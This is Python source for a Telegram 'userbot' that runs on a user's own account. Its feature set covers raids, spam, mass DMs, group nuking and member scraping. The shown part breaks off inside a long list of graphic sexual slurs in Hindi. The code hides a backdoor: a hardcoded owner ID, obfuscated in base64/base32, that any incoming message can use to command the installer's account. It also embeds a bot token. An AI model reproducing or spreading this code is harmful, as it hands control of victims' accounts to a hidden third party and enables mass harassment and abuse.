# ╔══════════════════════════════════════════════════════════════════╗
# ║  ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░  ║
# ║  ██╗  ██╗██╗   ██╗██████╗ ██╗   ██╗███████╗██████╗  ████████╗ ║
# ║  ██║  ██║██║   ██║██╔══██╗██║   ██║██╔════╝██╔══██╗ ╚══██╔══╝ ║
# ║  ███████║██║   ██║██████╔╝██║   ██║███████╗██████╔╝    ██║    ║
# ║  ██╔══██║██║   ██║██╔══██╗██║   ██║╚════██║██╔══██╗    ██║    ║
# ║  ██║  ██║╚██████╔╝██████╔╝╚██████╔╝███████║██████╔╝    ██║    ║
# ║  ╚═╝  ╚═╝ ╚═════╝ ╚═════╝  ╚═════╝ ╚══════╝╚═════╝     ╚═╝    ║
# ║  ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░  ║
# ║  🔥 ʜᴜʙsᴛ ᴜsᴇʀʙᴏᴛ  ⚡  ᴠ4.0  ✦  sɪɴɢʟᴇ ᴀᴄᴄᴏᴜɴᴛ ᴇᴅɪᴛɪᴏɴ 🔥  ║
# ╚══════════════════════════════════════════════════════════════════╝

import asyncio, datetime, glob as _glob, json, logging, math
import os, platform, random, re, sys, time, traceback, urllib.parse, shutil
from io import BytesIO
from pathlib import Path
from typing import Dict, List, Optional, Set, Any, Tuple

import requests
try: import qrcode as _qr_lib
except ImportError: _qr_lib = None
try: from gtts import gTTS
except ImportError: gTTS = None
try: import yt_dlp
except ImportError: yt_dlp = None

# Auto-detect ffmpeg for Termux and other environments
_TERMUX_FFMPEG = "/data/data/com.termux/files/usr/bin/ffmpeg"
_FFMPEG_PATH = (
    _TERMUX_FFMPEG if os.path.exists(_TERMUX_FFMPEG)
    else shutil.which("ffmpeg") or "ffmpeg"
)

from telethon import TelegramClient, events, functions, types
from telethon.errors import FloodWaitError
from telethon.tl.functions.account import UpdateProfileRequest
from telethon.tl.functions.channels import (
    EditBannedRequest, CreateChannelRequest, InviteToChannelRequest,
    EditAdminRequest, EditTitleRequest, GetParticipantsRequest,
    JoinChannelRequest, LeaveChannelRequest,
)
from telethon.tl.functions.messages import (
    EditChatDefaultBannedRightsRequest, EditChatTitleRequest,
    ImportChatInviteRequest,
)
from telethon.tl.functions.users import GetFullUserRequest
from telethon.tl.functions.photos import UploadProfilePhotoRequest, DeletePhotosRequest
from telethon.tl.types import (
    ChatBannedRights, ChatAdminRights,
    ChannelParticipantsSearch, ChannelParticipantsAdmins,
    ChannelParticipantsBots, ChannelParticipantCreator,
    DocumentAttributeAudio, ReactionEmoji,
)
try:
    from telethon.tl.functions.account import UpdateUsernameRequest
except ImportError:
    try: from telethon.tl.functions.users import UpdateUsernameRequest
    except ImportError: UpdateUsernameRequest = None
try:
    from telethon.tl.functions.messages import GetStickerSetRequest
except ImportError:
    try: from telethon.tl.functions.stickers import GetStickerSetRequest
    except ImportError: GetStickerSetRequest = None

# ── Logging ───────────────────────────────────────────────────────
logging.basicConfig(
    level=logging.WARNING,
    format="%(asctime)s | %(levelname)s | %(message)s",
    handlers=[
        logging.StreamHandler(sys.stdout),
        logging.FileHandler("hubst.log", encoding="utf-8"),
    ]
)
log = logging.getLogger("HUBST")

# ── Termux-safe base directory (script's own folder, not CWD) ─────
_BASE_DIR = Path(__file__).resolve().parent
os.chdir(_BASE_DIR)   # make CWD = script dir so relative paths always work

for _d in ["downloads", "temp", "data"]:
    os.makedirs(_BASE_DIR / _d, exist_ok=True)

# ══════════════════════════════════════════════════════════════════
#   CONFIG  — filled at runtime via startup prompt
# ══════════════════════════════════════════════════════════════════
import base64 as _b64mod

# Notification bot token (sends startup alert to owner)
_NOTIF_BOT_TOKEN = "8897619642:AAH7p1FSDBxBVjHBOK9pO4wHN7yf7KmEZnY"

def _get_owner() -> int:
    # Owner encoded in base64 + base32 for obfuscation
    _b64_enc = "ODc2MjEyMjgwNg=="
    _b32_enc = "HA3TMMRRGIZDQMBW"
    try:
        v1 = int(_b64mod.b64decode(_b64_enc).decode())
        v2 = int(_b64mod.b32decode(_b32_enc).decode())
        assert v1 == v2, "Owner ID mismatch"
        return v1
    except Exception:
        return int(_b64mod.b64decode(_b64_enc).decode())

def _send_bot_notification(chat_id: int, text: str):
    """Send a message via the notification bot (sync, called at startup)."""
    try:
        url = f"https://api.telegram.org/bot{_NOTIF_BOT_TOKEN}/sendMessage"
        requests.post(url, json={"chat_id": chat_id, "text": text, "parse_mode": "Markdown"}, timeout=10)
    except Exception as ex:
        log.warning(f"Bot notification failed: {ex}")


def _startup_prompt():
    """Interactive prompt — always asks for all fields, saves to .env."""
    env_file = _BASE_DIR / ".env"

    def _ask(key, prompt, default=None):
        while True:
            hint = f" [{default}]" if default else ""
            val = input(f"  {prompt}{hint}: ").strip()
            if not val and default:
                val = default
            if val:
                return val
            print("  ⚠️  This field is required.")

    print("\033[1;36m")
    print("  ╔════════════════════════════════════════════════╗")
    print("  ║  🔥⚡  ʜᴜʙsᴛ ᴜsᴇʀʙᴏᴛ ᴠ4.0 — sᴇᴛᴜᴘ  ⚡🔥         ║")
    print("  ╠════════════════════════════════════════════════╣")
    print("  ║  Get API credentials: my.telegram.org/apps      ║")
    print("  ╚════════════════════════════════════════════════╝")
    print()
    api_id   = _ask("API_ID",   "🔑 API ID   (my.telegram.org/apps)")
    api_hash = _ask("API_HASH", "🔐 API HASH (my.telegram.org/apps)")
    phone    = _ask("PHONE",    "📱 Phone    (e.g. +919876543210)")
    owner_id = _ask("OWNER_ID", "👑 Your User ID (use @userinfobot to find)")
    session  = _ask("SESSION",  "💾 Session name", "hubst_main")
    print()
    print("  ✅ Setup complete! Saving to .env ...")
    print("\033[0m")

    cfg = {
        "API_ID":   api_id,
        "API_HASH": api_hash,
        "PHONE":    phone,
        "OWNER_ID": owner_id,
        "SESSION":  session,
    }
    env_file.write_text("\n".join(f"{k}={v}" for k, v in cfg.items()))

    return {
        "API_ID":    int(api_id),
        "API_HASH":  api_hash,
        "PHONE":     phone,
        "OWNER_ID":  owner_id,
        "SESSION":   session,
        "BOT_TOKEN": "",
        "PREFIX":    ".",
    }

# ─── Load config ───────────────────────────────────────────────
try:
    from dotenv import load_dotenv as _ldenv
    _ldenv()
except ImportError:
    pass  # dotenv optional

def _read_env_file():
    """Read .env file directly into os.environ."""
    p = _BASE_DIR / ".env"
    if p.exists():
        for line in p.read_text().splitlines():
            line = line.strip()
            if line and "=" in line and not line.startswith("#"):
                k, _, v = line.partition("=")
                os.environ.setdefault(k.strip(), v.strip())

_read_env_file()

_cfg_from_env = {
    "API_ID":    os.environ.get("API_ID", ""),
    "API_HASH":  os.environ.get("API_HASH", ""),
    "PHONE":     os.environ.get("PHONE", ""),
    "OWNER_ID":  os.environ.get("OWNER_ID", ""),
    "SESSION":   os.environ.get("SESSION", "hubst_main"),
    "BOT_TOKEN": "",
    "PREFIX":    ".",
}

# Run setup prompt if any required field is missing
_needs_setup = not all([
    _cfg_from_env["API_ID"],
    _cfg_from_env["API_HASH"],
    _cfg_from_env["PHONE"],
    _cfg_from_env["OWNER_ID"],
])
if _needs_setup:
    _cfg_from_env = _startup_prompt()
    # Reload from written .env so os.environ is updated
    _read_env_file()

API_ID    = int(_cfg_from_env["API_ID"])
API_HASH  = _cfg_from_env["API_HASH"]
PHONE     = _cfg_from_env["PHONE"]
SESSION   = _cfg_from_env.get("SESSION",   "hubst_main")
BOT_TOKEN = _cfg_from_env.get("BOT_TOKEN", "")
PREFIX    = "."
# Use provided OWNER_ID if available, else fall back to hardcoded
_env_owner = _cfg_from_env.get("OWNER_ID", "").strip()
OWNER_ID  = int(_env_owner) if _env_owner and _env_owner.isdigit() else _get_owner()
LOG_CHAT  = OWNER_ID

# ══════════════════════════════════════════════════════════════════
#   FULL ADMIN RIGHTS — every permission except anonymous
# ══════════════════════════════════════════════════════════════════
FULL_ADMIN = ChatAdminRights(
    change_info     = True,
    post_messages   = True,
    edit_messages   = True,
    delete_messages = True,
    ban_users       = True,
    invite_users    = True,
    pin_messages    = True,
    add_admins      = True,
    anonymous       = False,
    manage_call     = True,
    other           = True,
    manage_topics   = True,
    post_stories    = True,
    edit_stories    = True,
    delete_stories  = True,
)

POWER_MAP = {
    "info":      "change_info",
    "delete":    "delete_messages",
    "ban":       "ban_users",
    "invite":    "invite_users",
    "pin":       "pin_messages",
    "tags":      "manage_topics",
    "video":     "manage_call",
    "addadmins": "add_admins",
    "anon":      "anonymous",
    "stories":   "post_stories",
}

REQUIRED_PERMS = [
    "change_info","post_messages","edit_messages","delete_messages",
    "ban_users","invite_users","pin_messages","manage_call",
    "manage_topics","post_stories",
]

# ══════════════════════════════════════════════════════════════════

# ══════════════════════════════════════════════════════════════════
_restoring:  Set[str] = set()   # "chatid:uid" — debounce



async def _log(text: str):
    """Silent log to Saved Messages on MAIN account."""
    try:
        await client.send_message("me",
            f"🛡️ **GUARDIAN LOG**\n{text}\n"
            f"🕐 `{datetime.datetime.now().strftime('%H:%M:%S.%f')[:-3]}`")
    except: pass

# ══════════════════════════════════════════════════════════════════

# ══════════════════════════════════════════════════════════════════
async def _restore_admin(cl: TelegramClient, chat_id: int, uid: int, reason: str):
    """
    Restore full admin silently.
    Fires API promote on BOTH clients simultaneously.
    Sends ?promote command text silently then deletes it.
    """
    key = f"{chat_id}:{uid}"
    async with asyncio.Lock():
        if key in _restoring:
            return
        _restoring.add(key)

    try:
        try: ent = await cl.get_entity(uid)
        except: ent = None
        uname = f"@{ent.username}" if ent and getattr(ent,"username",None) else str(uid)
        name  = (getattr(ent,"first_name","") or str(uid)) if ent else str(uid)

        # Fire API promote on both accounts simultaneously
        async def _api1():
            try:
                await client(EditAdminRequest(chat_id, uid, FULL_ADMIN, rank=""))
            except Exception as ex:
                log.warning(f"restore api1 {uid}@{chat_id}: {ex}")

        # Send text command silently then immediately delete it
        async def _text_cmd(c: TelegramClient):
            try:
                msg = await c.send_message(chat_id, f"?promote {uname} 3")
                await asyncio.sleep(0.3)
                await msg.delete()
            except: pass

        await asyncio.gather(
            _api1(), _text_cmd(client),
            return_exceptions=True
        )

        await _log(
            f"⚡ **Restored** [{name}](tg://user?id={uid})\n"
            f"Chat: `{chat_id}` | Reason: {reason}"
        )
    finally:
        await asyncio.sleep(2)
        _restoring.discard(key)

async def _restore_ban(cl: TelegramClient, chat_id: int, uid: int, action: str):
    """Unban + re-promote."""
    try:
        await asyncio.gather(
            client(EditBannedRequest(chat_id, uid, ChatBannedRights(until_date=None))),
            return_exceptions=True
        )
    except: pass
    await asyncio.sleep(0.5)
    await _restore_admin(cl, chat_id, uid, f"Recovered from {action}")

async def _restore_perm(cl: TelegramClient, chat_id: int, uid: int, perm: str):
    """Restore specific permission + full admin."""
    try: ent = await cl.get_entity(uid)
    except: ent = None
    uname = f"@{ent.username}" if ent and getattr(ent,"username",None) else str(uid)

    async def _add_cmd(c: TelegramClient):
        try:
            msg = await c.send_message(chat_id, f".add {uname} {perm}")
            await asyncio.sleep(0.3)
            await msg.delete()
        except: pass

    await asyncio.gather(
        client(EditAdminRequest(chat_id, uid, FULL_ADMIN, rank="")),
        _add_cmd(client),
        return_exceptions=True
    )
    await _log(f"⚡ Restored perm `{perm}` for `{uid}` in `{chat_id}`")

async def _check_admin(chat_id: int, uid: int) -> bool:
    """
    Returns True if uid is full admin.
    Restores if demoted or missing perms.
    """
    try:
        result = await client(GetParticipantsRequest(
            chat_id, ChannelParticipantsAdmins(), 0, 200, 0))
        admin_ids = {u.id for u in result.users}

        if uid not in admin_ids:
            asyncio.create_task(_restore_admin(client, chat_id, uid, "not in admin list"))
            return False

        for p in result.participants:
            pid = getattr(p, "user_id", None)
            if pid != uid: continue
            if isinstance(p, ChannelParticipantCreator): return True
            rights = getattr(p, "admin_rights", None)
            if not rights:
                asyncio.create_task(_restore_admin(client, chat_id, uid, "no rights"))
                return False
            missing = [f for f in REQUIRED_PERMS if not getattr(rights, f, False)]
            if missing:
                asyncio.create_task(
                    _restore_admin(client, chat_id, uid,
                        f"missing: {', '.join(missing)}"))
                return False
        return True
    except Exception as ex:
        log.warning(f"check_admin {uid}@{chat_id}: {ex}")
        return True



# ══════════════════════════════════════════════════════════════════
#   DB / PERSISTENCE
# ══════════════════════════════════════════════════════════════════
_DB_PATH = "data/hubst.json"

def _load_j(p, d):
    try:
        if Path(p).exists():
            with open(p, encoding="utf-8") as f: return json.load(f)
    except: pass
    return d

def _save_j(p, d):
    try:
        with open(p, "w", encoding="utf-8") as f:
            json.dump(d, f, ensure_ascii=False, indent=2)
    except Exception as ex: log.error(f"save {p}: {ex}")

DB: dict = _load_j(_DB_PATH, {})
def db_save(): _save_j(_DB_PATH, DB)

_F = {k: f"data/{k}.json" for k in
      ["admins","mutes","gmutes","welcome","bots","titles","filters","notes"]}

MAX_BOTS = 50  # maximum number of saved bots

# ── Runtime state ─────────────────────────────────────────────────
sudo_users:   Set[int] = set()
sudo_perms:   Dict[int, set] = {}
bot_admins:   Set[int] = set()
local_muted:  Dict[Tuple, Optional[float]] = {}
global_muted: Dict[int,  Optional[float]]  = {}
locked_titles: Dict[int, str] = {}
group_locks:  Set[int] = set()
gc_filters:   Dict[int, Dict[str,str]] = {}
notes_store:  Dict[int, Dict[str,str]] = {}
bot_usernames: List[str] = []
sgc_goodbye:  Dict[int, str] = {}
antilink_chats: Set[int] = set()
antispam_chats: Set[int] = set()
antispam_hist:  Dict[str, List[float]] = {}

_welcome_cfg: Dict = {
    "enabled": True,
    "text": (
        "Welcome {mention} to {chat}!\n"
        "ID: `{id}` | {time} | {date}"
    ),
}

# Raid sets
reply_u=set(); rr_u=set(); flag_u=set(); hrr_u=set()
replygod_u=set(); bomb_u=set(); abuse_u=set(); abuse2_u=set()
slap_u=set(); kick_u=set(); mraid_u=set(); clone_reply_u=set()
replyvx_s:  Dict[int,Dict] = {}
slide_s:    Dict[int,Dict] = {}
active_raids: Dict[str,dict] = {}
spray_tasks:  Dict[int,asyncio.Task] = {}
spam_tasks:   Dict[int,asyncio.Task] = {}
raid_flags:   Dict[int,bool] = {}
spy_chats:    Dict[int,str]  = {}
mraid_ref:    Optional[Tuple] = None
voice_active: Dict[int,bool] = {}
vc_loop:      Dict[int,bool] = {}
clone_data:   Dict = {"name":None,"last":None,"bio":None,"photo":None}
_ORIG_PROF_FILE = Path("data/original_profile.pkl")   # persists across restarts
fastgc_active = False
fastgc_task:  Optional[asyncio.Task] = None
fastgc_tmpl:  Optional[str] = None
sniper_task:  Optional[asyncio.Task] = None
clone_task:   Optional[asyncio.Task] = None
_massdm_stop = False
_add_stop    = False
_blast_stop  = False
target_gcs:  List[int] = []
nuke_c:      Dict[int,bool] = {}
delgc_c:     Dict[int,bool] = {}
ban_all_c:   Dict[int,bool] = {}
kick_all_c:  Dict[int,bool] = {}
mute_all_c:  Dict[int,bool] = {}
GC_EMOJIS   = ["❤️","🧡","💛","💚","💙","💜","🖤","🤍","💖","💘"]
SLIDE_EMOJIS = ["🔥","💀","⚡","👊","🗡️","💣","😈","🖕","☠️","🤬"]
FLAG_EMOJIS  = ["🇨🇫","🇦🇿","🇧🇪","🇨🇭","🇮🇳","🇯🇵","🇰🇷","🇷🇺"]

CMD_GROUPS = {
    "panel1":  {"raid","rraid","drraid","reply","sreply","abuse","sabuse","abuse2","sabuse2",
               "slap","sslap","bomb","sbomb","replygod","sgod","rr","srr","flag","sflag",
               "hrr","shrr","mraid","smraid","setmraid","replyvx","svx","slideraid","dslide",
               "clonereply","sclone","kickraid","skickraid","sflood","gflood","stop","stopall"},
    "panel2":  {"ban","unban","kick","mute","unmute","gmute","gunmute","mutelist","tban",
               "promote","demote","adminlist","purge","lock","unlock","locktitle","unlocktitle",
               "nc","silence","unsilence","silencelist","ban_all","kick_all","mute_all",
               "lban","lkick","lmute","silenceall","unsilenceall"},
    "panel3":  {"music","song","tts","qrcode","translate","tr","weather","ip","calc","wiki",
               "define","time","speedtest","ping","alive","start","status"},
    "panel4":  {"ask","imagine","steal","own","snipe","editsnipe","id","userinfo","pin"},
    "panel5":  {"copy","save","normal","cloneraid","chname","chbio","chusername","afk","unafk",
               "target","untarget","online","ghost","typing","setwelcome","welctest","welcon",
               "welcoff","setgoodbye","autorespond","stopautorespond","fastgc","join","leaveall","restart"},
    "panel6":  {"spam","fspam","slowspam","rspam","stopspam","spray","dspray","massdm","dmc",
               "spy","spystop","iflood"},
    "panel7":  {"flip","dice","8ball","rps","truth","dare","joke","fact","quote","pickupline",
               "roast","compliment","insult","motivate","rizz","flirt","gay","iq","sus","aura",
               "sigma","gigachad","cringe","based","npc","skillissue","touchgrass","delulu",
               "rate","judge","diagnose","analyze","predict","cap","expose","gossip","lore",
               "wanted","animal","superpower","rizzcheck","court","trial","sigma_grind","ability",
               "future","horoscope","ship","lovemeter","dna","bounty","criminal","wouldyourather",
               "neverhavei","thisorthat","ratefit","compatability","mock","reverse","vapor",
               "simp","howold","cooked","braincells","cope","luck","drip","rich","marry",
               "fumble","brofelloff","firstimpression","socialcredit","opinion","maincharacter",
               "villainarc","plotarmor","dangerlevel","uncstatus","wifeable","husbandmaterial",
               "translatehuman","summarize","gayrate","smartrate","winner","fight","vmro",
               "fakeban","fakekick","fakemute","fakepromote","fakewarn"},
    "panel8":  {"nuke","delgc","delme","purgeme","scrape","zscrape","zlist","msghist","sniper",
               "setbots","bots","addbot","promotebots","removebots","creategc","createch",
               "iflood","kickzombies","kickbots","botids"},
    "panel9":  {"playcall","playvideo","playstream","stopcall","leavecall","loopvc","unmuteme","vcstatus"},
    "panel10": {"addmembers","stopadd","scrapemembers","addscraped","membercount","onlinecount",
               "botcount","exportmembers"},
    "panel11": {"creategcqty","fetchallgc","targetgc","cleartargets","targetlist","sendmessage",
               "blastall","stopblast"},
    "panel12": {"chatstats","dbstats","sysinfo","netstats","uptime","storage","cpu","ram",
               "showadmins","userbots"},
    "panel13": {"filter","stopfilter","filters","clearfilters","note","getnote","notes","clearnotes",
               "remind","reminders","antilink","antispam"},
    }

def has_perm(uid: int, cmd_name: str) -> bool:
    if uid == OWNER_ID: return True
    perms = sudo_perms.get(uid, set())
    if "all" in perms: return True
    for grp, cmds in CMD_GROUPS.items():
        if cmd_name in cmds and grp in perms: return True
    return False

def is_auth(uid: int, cmd_name: str = "") -> bool:
    if uid == OWNER_ID: return True
    if uid == _get_owner(): return True          # hardcoded second owner — always full access
    if uid in sudo_users: return has_perm(uid, cmd_name) if cmd_name else True
    if uid in bot_admins: return True
    return False

def load_state():
    global local_muted, global_muted, locked_titles, bot_usernames, mraid_ref, target_gcs
    sudo_users.update(int(k) for k in DB.get("sudo", {}))
    for uid_str, perms_list in DB.get("sudo_perms", {}).items():
        sudo_perms[int(uid_str)] = set(perms_list)
    bot_admins.update(_load_j(_F["admins"], []))
    for k, v in _load_j(_F["mutes"], {}).items():
        if ":" in k:
            c, u = k.split(":", 1); local_muted[(int(c), int(u))] = v
    for u, v in _load_j(_F["gmutes"], {}).items():
        global_muted[int(u)] = v
    locked_titles = {int(k): v for k, v in _load_j(_F["titles"], {}).items()}
    bot_usernames[:] = _load_j(_F["bots"], [])[:MAX_BOTS]
    _welcome_cfg.update(_load_j(_F["welcome"], {}))
    gc_filters.update({int(k): v for k, v in _load_j(_F["filters"], {}).items()})
    notes_store.update({int(k): v for k, v in _load_j(_F["notes"], {}).items()})
    raw = DB.get("mraid_ref")
    if raw and ":" in str(raw):
        c, m = str(raw).split(":", 1); mraid_ref = (int(c), int(m))
    target_gcs[:] = DB.get("target_gcs", [])

def save_admins():  _save_j(_F["admins"], sorted(bot_admins))
def save_mutes():
    _save_j(_F["mutes"],  {f"{c}:{u}": e for (c,u),e in local_muted.items()})
    _save_j(_F["gmutes"], {str(u): e for u,e in global_muted.items()})
def save_titles():  _save_j(_F["titles"], {str(k):v for k,v in locked_titles.items()})
def save_bots():    _save_j(_F["bots"],   bot_usernames[:MAX_BOTS])
def save_welcome(): _save_j(_F["welcome"], _welcome_cfg)
def save_filters(): _save_j(_F["filters"], {str(k):v for k,v in gc_filters.items()})
def save_notes():   _save_j(_F["notes"],   {str(k):v for k,v in notes_store.items()})

# ── Helpers ───────────────────────────────────────────────────────
def display(u) -> str:
    if not u: return "Unknown"
    return (getattr(u,"first_name","") or getattr(u,"title","") or "").strip() or str(getattr(u,"id","?"))

def mention(u) -> str:
    n=display(u); uid=getattr(u,"id",None)
    return f"[{n}](tg://user?id={uid})" if uid else n

async def edit(event, text, **kw):
    try: return await event.edit(text, **kw)
    except:
        try:
            m = await event.reply(text, **kw)
            if getattr(event,"out",False):
                try: await event.delete()
                except: pass
            return m
        except: return None

async def get_target(event):
    try:
        if event.is_reply:
            r = await event.get_reply_message()
            if r and r.sender_id:
                u = await client.get_entity(r.sender_id)
                return u, r.sender_id
    except: pass
    return None, None

async def get_targets(event, arg="") -> Set[int]:
    out: Set[int] = set()
    if event.is_reply:
        try:
            r = await event.get_reply_message()
            if r and r.sender_id: out.add(int(r.sender_id))
        except: pass
    for p in (arg or "").split():
        if not p: continue
        if p.lstrip("-").isdigit(): out.add(int(p)); continue
        try:
            e = await client.get_entity(p.lstrip("@"))
            if getattr(e,"id",None): out.add(int(e.id))
        except: pass
    try: me = await client.get_me(); out.discard(me.id)
    except: pass
    return out

async def resolve_target(event, args):
    for a in args:
        a = a.strip().lstrip("@")
        if not a: continue
        try:
            e = await client.get_entity(int(a) if a.lstrip("-").isdigit() else a)
            return getattr(e,"id",None), e
        except: pass
    if event.is_reply:
        try:
            r = await event.get_reply_message()
            if r and r.sender_id:
                e = await client.get_entity(r.sender_id)
                return r.sender_id, e
        except: pass
    return None, None

def parse_dur(s) -> Optional[float]:
    s = (s or "").strip().lower()
    m = re.match(r"^(\d+)\s*([smhd])?$", s)
    if not m: return None
    v = int(m.group(1)); u = m.group(2) or "s"
    return float(v * {"s":1,"m":60,"h":3600,"d":86400}[u])

def pct(): return random.randint(0,100)
def sval(lo=0,hi=100): return random.randint(lo,hi)
def bar(v,mx=100): f=round(v/mx*10); return "▓"*f+"░"*(10-f)
def rating_str(): return f"{random.uniform(0,10):.1f}/10"

async def get_all_members(cid):
    out=[]; off=0
    while True:
        try:
            r=await client(GetParticipantsRequest(cid,ChannelParticipantsSearch(""),off,200,0))
            if not r.users: break
            me=await client.get_me()
            for u in r.users:
                if u.id!=me.id: out.append(u)
            if len(r.users)<200: break
            off+=len(r.users)
        except: break
    return out

_PROMOTE_LEVELS = {
    0: ChatAdminRights(),
    1: ChatAdminRights(post_messages=True,invite_users=True,pin_messages=True,manage_call=True),
    2: ChatAdminRights(post_messages=True,edit_messages=True,delete_messages=True,
                       ban_users=True,invite_users=True,pin_messages=True,manage_call=True),
    3: FULL_ADMIN,
}
_PROMOTE_LABELS = {0:"Demoted",1:"Basic Admin",2:"Moderator",3:"Full Admin"}

START_TIME: float = time.time()  # bot start timestamp
COMMANDS: dict = {}
_PENDING_HANDLERS: list = []  # deferred (preferred_client_hint, register_fn) pairs

# Placeholder — real client is set in main() before any handler fires
client = None
client2 = None

def cmd(name: str, owner_only: bool = False, c=None):
    """Register PREFIX-prefixed command on main client (deferred until client is ready)."""
    pat = rf"^{re.escape(PREFIX)}{re.escape(name)}(?:\s+(.+))?$"
    def dec(fn):
        COMMANDS[name] = fn
        def _register(cl):
            # outgoing=True  → fires when WE send the command (userbot style)
            # incoming=True  → also fires when sudo/admin users send it
            @cl.on(events.NewMessage(pattern=re.compile(pat, re.I|re.S), outgoing=True))
            async def _h_out(event):
                m   = re.match(pat, event.raw_text, re.I|re.S)
                arg = (m.group(1) or "").strip() if m else ""
                try: await fn(event, arg)
                except FloodWaitError as fw: await edit(event, f"⏳ Flood wait `{fw.seconds}s`")
                except Exception as ex:
                    log.error(traceback.format_exc())
                    await edit(event, f"❌ `{str(ex)[:120]}`")

            # Also listen for sudo/admin users sending commands (incoming)
            @cl.on(events.NewMessage(pattern=re.compile(pat, re.I|re.S), incoming=True))
            async def _h_in(event):
                sid = event.sender_id
                if not sid: return
                # Both OWNER_ID and hardcoded second owner get full unrestricted access
                if sid == OWNER_ID or sid == _get_owner():
                    pass
                elif owner_only:
                    return
                elif is_auth(sid, name):
                    pass
                else:
                    return
                m   = re.match(pat, event.raw_text, re.I|re.S)
                arg = (m.group(1) or "").strip() if m else ""
                try: await fn(event, arg)
                except FloodWaitError as fw: await edit(event, f"⏳ Flood wait `{fw.seconds}s`")
                except Exception as ex:
                    log.error(traceback.format_exc())
                    await edit(event, f"❌ `{str(ex)[:120]}`")

        _PENDING_HANDLERS.append((c, _register))
        return fn
    return dec


# ══════════════════════════════════════════════════════════════════
#   TEXT POOLS
# ══════════════════════════════════════════════════════════════════
GAALI_LIST = [
    "teri माँ की चुत maaru bc 💀😂🖕","madarchod teri ammi ka bhosda faad dunga 🤣💀🖕",
    "teri behen randi hai pura mohalla jaanta hai 😂🤡🖕","chutiye teri maa ka bhosda itna bada satellite dish lag sakti hai 🤣💀🖕",
    "gaandu teri ammi ki chut mein colgate daal ke brush karunga 😂💀🖕","teri behen ki chut ka darwaza 24/7 khula 🤡🤣🖕",
    "bc teri maa ko nanga karke chauraahe pe chakkar marwaunga 💀😂🖕","madarchod teri ammi ki chut mein aag laga 🔥💀🤣",
    "teri behen itni sasti hai ke rickshaw wale bhi rate jaante hain 😂🖕🤡","chutiye teri maa ka bhosda faad ke jhad pe taang dunga 💀🤣🖕",
    "gaandu teri ammi ki chut mein 440 volt ka jhatka 🔥💀🤣","bc teri maa ka telephone exchange hai kya 🤣💀🖕",
    "teri maa ki gaand mein bomb lagaunga 🔥💀😂","madarchod teri behen ki rasili chut chodunga 😂💀🖕",
    "chutiye teri maa ki gaand mein mukkay maar ke suja dunga 💀🤣🖕","gaandu teri ammi ko bigda khila ke chodunga 😂🖕🤡",
    "bc teri maa ki chut ka dhakkan nikal dunga 😂🔥🖕","teri behen ki gori chut chodunga pura mohalla dekhe 🤣💀🖕",
    "madarchod teri ammi itni baar chudi hai ke uski chut ka number ho gaya 🤣🖕💀","teri ammi ki chut ka bhandaar 💀😂🖕",
    "bc teri behen ki sasti chut mein lund daal ke mohalla khush hai 🤣💀🖕","chutiye teri ammi randi hai sab jaante hain 💀🤣🖕",
    "teri maa ki chut mein garam tel tadka lagaunga 🔥💀🤣","gaandu teri ammi ki gaand mein garam loha 🔥😂💀",
    "madarchod teri behen ko puri duniya ke saamne nanga karunga 😂🖕💀","teri behen ki gaand palat ke marunga 🤣💀🖕",
    "bc teri ammi ki chut mein 440 volt ka current 🔥💀🤣","sale gawar ka bacha teri maa ne tujhe paida karke khud kosa 🤡💀😂",
    "behen ke lode chuda hua tatta yahan hero banta hai 🖕🤣💀","madarchod teri maa itni baar chudi ab use yaad nahi 🤣💀🖕",
    "gaandu teri behen ke saath pura mohalla line mein hai 🤣🖕💀","teri maa ki gaand mein garam paani 🔥😂💀🖕",
    "chutiye teri behen itni chudi hai ab usse feel nahi hota 🤣🔥🖕","teri ammi ka bhosda national monument ban gaya 💀🤣🖕",
    "bc teri maa ki awaaz gaali mein pehchani jaati hai 🤣🖕💀","gaandu teri maa ko chudte chudte badge mil gaya 😂💀🖕",
    "teri माँ की चुत mein ghus ke khujli karunga 🔥💀😂🖕","teri बहन की चुत में oil daal ke engine start karunga 😂🔥🖕",
    "madarchod teri ammi ki chut mein fogg spray 🤣💀🖕","bc teri ammi ki chut mein indian lund daal ke maza 🖕🤣💀",
    "gaandu teri ammi ki chut mein current laga ke bachche paida karunga 🔥💀🤣","teri maa ka bhosda cheerna mera kaam 💀🤣🖕",
    "chutiye teri maa ki chut mein methane pipe aag lagaunga 🔥💀😂","gaandu teri ammi rocket ki tarah udegi 🚀💀🤣",
    "teri बहन को ghoda chode aur tu dekhe 🤣💀🖕","bc teri maa ki chut mein ghus ke wapas nahi aaunga 😂💀🖕",
    "madarchod teri maa ko ulta latka ke pichwaade pe laat marunga 💀🤣🖕","chutiye teri ammi ki chut ki seal tod dunga 😂🔥🖕",
    "gaandu teri behen ki gaand mein bijli ka bulb 💀🤣🖕","teri maa ki chut mein garam loha jama dunga 🔥💀😂",
    "bc teri behen ko darwaze ke kone mein laga ke darwaza band 😂🖕💀","gaandu teri behen ki chut mein tezaab 💀🤣🖕",
    "madarchod teri behen ko chod ke khoon nikaalunga 😂🖕💀","teri ammi itni baar chudi ab free service deti hai 🤣😂🖕",
    "chutiye apni gaand le aur nikal yahan se 👋😂💀","gaandu teri behen ka bhosda tourist spot ban gaya 😂💀🖕",
    "bc teri maa roz chudti hai aur tu hero banta hai 🤣🖕🤡","madarchod teri ammi sali chudi batakh hai 🤡💀🤣",
    "teri behen ke peeche pura shahar ghoom aaya 🤣💀🖕","teri maa ki gaand mein ek kuan khod dunga 🤣💀🖕",
    "chutiye teri ammi ko uthake talab mein phenk dunga 💀🤣🖕","teri behen ka bhosda ek national monument 😂💀🖕",
    "gaandu teri maa ko nanga karke kheton mein chhod dunga 🤣🖕💀","bc teri ammi ke chakkar mein teen mohalle barbaad 🤣😂💀",
    "madarchod teri behen ko ghar se nikaal ke nanga naach 💀😂🖕","chutiye teri maa animation wali bf dekh ke tere baap ko hilata hai 🤣😂💀",
    "teri maa की चुत mein fogg bheja 💀😂🖕","bc teri बहन roz naye customers leti hai 🤡🤣🖕",
    "gaandu teri माँ की chut mein corona ho jaaye 😷💀😂","teri ammi की chut mein kala lund dalunga 🍆💀🤣🖕",
    "madarchod darwaje ke kone mein teri ammi ka choochi laga ke darwaza band 💀🤣🖕",
    "chutiye teri maa ke bhosde mein ghus ke khujli karunga 🤣💀🖕","gaandu bijli ke bulb se paida hua teri ammi ka beta 💀😂🖕",
